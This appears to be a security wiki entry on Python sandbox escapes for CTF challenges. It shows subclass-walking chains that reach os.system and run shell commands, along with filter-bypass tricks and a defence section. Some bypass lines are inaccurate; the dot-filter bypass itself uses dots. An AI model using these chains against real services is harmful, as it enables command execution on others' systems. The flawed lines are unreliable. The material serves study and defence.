---
title: Python Sandbox Escape Patterns
slug: python-sandbox-escape
---

> **TL;DR:** Even when `__builtins__` is stripped, Python's object graph still exposes `os`, `subprocess`, and file handles through `__class__.__mro__` and `__subclasses__()` chains.

## What it is
A Python "sandbox" usually means a constrained `eval`/`exec` with builtins removed or a custom AST validator. CTF challenges hand you a single input field that ends up inside `eval(user, {"__builtins__": {}})` or a restricted REPL. The escape relies on the fact that every object's class hierarchy can be walked back to `object`, from which all subclasses (including IO wrappers around `os.system`) are reachable.

## Preconditions / where it applies
- CPython 3.x with a hand-rolled allowlist or `__builtins__ = {}` style sandbox
- Input flows into `eval`, `exec`, `compile`, or a tiny calculator DSL
- Common restrictions: no `import`, no `_`/`__`, no `.` chars, no `()`, length caps

## Technique
Walk from any literal to the subclass list, find a useful gadget, call it.

```python
# baseline chain: any literal -> object -> all subclasses
().__class__.__bases__[0].__subclasses__()

# locate os._wrap_close, whose __init_subclass__ globals hold `system`
for i, c in enumerate(().__class__.__bases__[0].__subclasses__()):
    if c.__name__ == "_wrap_close":
        idx = i

# pop a shell without the word "system" if filtered
g = ().__class__.__bases__[0].__subclasses__()[idx].__init__.__globals__
g["system"]("id")

# dunder filter? use getattr via class.__getattribute__
gattr = ().__class__.__getattribute__
gattr(gattr, "__class__")

# dot-filter bypass via f-string format spec
x = ()
f"{x:{x.__class__.__name__}}"   # triggers attribute access without literal '.'

# parenless call via list comprehension + decorator-like trick
[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__=="Popen"]
```

If `()` is blocked, swap for `''`, `{}`, or `0j`. If digits are blocked, use `True+True`. If `__` is blocked, build the string via `chr` reachable through `bytes([95]).decode()*2`.

## Detection and defence
- Do not roll your own sandbox; use a subprocess in a seccomp+namespace jail or a WASM runtime
- For DSLs, parse with `ast.parse` and walk the tree allowlisting node types — never `eval`
- Use `sys.addaudithook` to log `compile`, `exec`, `os.system`, `subprocess.Popen` and alert on unexpected callers
- Drop CAP_SYS_ADMIN and mount `/proc` read-only so even a successful escape cannot pivot

## References
- [CPython data model](https://docs.python.org/3/reference/datamodel.html) — defines `__mro__` and `__subclasses__`
- [PEP 578 — runtime audit hooks](https://peps.python.org/pep-0578/) — defence layer

See also: [[python-dangerous-sinks]], [[python-format-string]], [[python-ssti-jinja]], [[python-sys-audit-bypass]].
